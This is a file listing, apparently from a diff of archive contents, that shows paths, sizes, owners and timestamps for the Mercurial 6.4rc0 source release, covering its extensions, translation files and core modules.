+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25346 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/hg.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13877 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/monotone.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13026 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/p4.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    61956 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/subversion.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5365 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/convert/transport.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/eol.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25435 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/extdiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4948 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/factotum.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/fastannotate/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6532 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12154 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/commands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/context.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      374 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/error.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5879 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/formatter.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8054 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/protocol.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8726 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/revmap.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastannotate/support.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6982 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fastexport.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6520 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fetch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    37191 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fix.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/fsmonitor/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33169 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38268 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32099 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/bser.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2665 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/capabilities.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2043 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/compat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2822 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/encoding.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3650 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/load.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18028 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/pywatchman/pybser.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4744 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/state.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3883 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/fsmonitor/watchmanclient.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/git/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1105 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/TODO.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11921 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11722 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/dirstate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18158 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/gitlog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      988 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/gitutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11605 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/index.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12250 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/git/manifest.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33129 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/githelp.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11271 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/gpg.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3360 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/graphlog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12065 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hgk.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/highlight/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3612 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/highlight/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3129 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/highlight/highlight.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    87682 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/histedit.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/hooklib/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      999 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3967 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/changeset_obsoleted.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/changeset_published.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1374 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/enforce_draft_commits.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1335 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/reject_merge_commits.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1233 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/hooklib/reject_new_heads.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.202632 mercurial-6.4rc0/hgext/infinitepush/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/README
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    45911 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3640 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/bundleparts.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1221 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/common.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3473 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/fileindexapi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2066 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/indexapi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1076 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/schema.sql
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9883 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/sqlindexapi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6241 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/infinitepush/store.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20494 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/journal.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30687 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/keyword.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext/largefiles/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/CONTRIBUTORS
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6901 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6612 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/basestore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22797 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/lfcommands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26928 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/lfutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2498 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/localstore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    64251 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/overrides.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7703 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/proto.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5159 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/remotestore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18695 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/reposetup.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2663 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/storefactory.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1572 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/largefiles/wirestore.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext/lfs/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7670 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/TODO.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14598 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29006 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/blobstore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2847 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/pointer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12003 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/wireprotolfsserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17138 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/lfs/wrapper.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2862 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/logtoprocess.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   146637 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/mq.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext/narrow/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      782 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/TODO.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2378 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowbundle2.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24515 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowcommands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2519 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowdirstate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      890 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1481 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowtemplates.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4839 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/narrow/narrowwirepeer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20518 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/notify.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2602 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/pager.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31840 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/patchbomb.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    82651 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/phabricator.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1747 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/purge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    83868 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/rebase.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/record.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22314 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/releasenotes.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6775 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/relink.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext/remotefilelog/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6096 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/README.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42141 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18524 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/basepack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15838 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/basestore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2429 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/connectionpool.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      966 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/constants.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13163 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/contentstore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15846 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/datapack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13599 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/debugcommands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/fileserverclient.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19110 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/historypack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5241 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/metadatastore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19317 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/remotefilectx.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/remotefilelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14389 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/remotefilelogserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31000 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/repack.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11103 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/shallowbundle.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11964 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/shallowrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      452 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/shallowstore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15312 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/shallowutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotefilelog/shallowverifier.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13853 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/remotenames.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5338 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/schemes.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7884 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/share.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16293 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/show.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12320 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/sparse.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6905 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/split.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    40162 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/sqlitestore.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      914 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/strip.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30733 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/transplant.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10328 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/uncommit.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7071 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/win32mbcs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7628 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/win32text.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext/zeroconf/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    61582 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/zeroconf/Zeroconf.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6996 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext/zeroconf/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.206632 mercurial-6.4rc0/hgext3rd/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      119 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgext3rd/__init__.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)      685 2023-03-02 22:29:51.000000 mercurial-6.4rc0/hgweb.cgi
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.210632 mercurial-6.4rc0/i18n/
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     7524 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/check-translation.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   528626 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/da.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   784964 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/de.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   252621 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/el.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   334018 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/fr.po
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5323 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/hggettext
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   415076 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/it.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)  1514507 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/ja.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1065 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/polib.LICENSE
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    62021 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/polib.py
+-rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3205 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/posplit
+-rw-r--r--   0 alphare   (1000) alphare   (1000)  1520505 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/pt_BR.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   427542 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/ro.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)  1285212 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/ru.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   580645 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/sv.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   269346 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/zh_CN.po
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   323995 2023-03-02 22:29:51.000000 mercurial-6.4rc0/i18n/zh_TW.po
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      377 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       61 2023-03-02 22:30:09.000000 mercurial-6.4rc0/mercurial/__version__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12717 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/ancestor.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10670 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/archival.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7249 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bdiff.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      463 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bdiff.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1767 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bitmanipulation.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bookmarks.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32260 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/branchmap.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    89418 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bundle2.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16011 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bundlecaches.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24962 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/bundlerepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      788 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cacheutil.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/cext/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3638 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/base85.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      145 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/base85.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7484 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/bdiff.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      348 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/bdiff.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11094 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/charencode.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2198 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/charencode.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/dirs.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26543 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/manifest.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4542 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/mpatch.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      193 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/mpatch.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/osutil.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      610 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/osutil.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34935 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/parsers.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3107 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/parsers.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17426 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/pathencode.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        8 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/py.typed
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    86522 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/revlog.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      392 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/revlog.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2804 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cext/util.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/cffi/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2431 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/bdiff.py
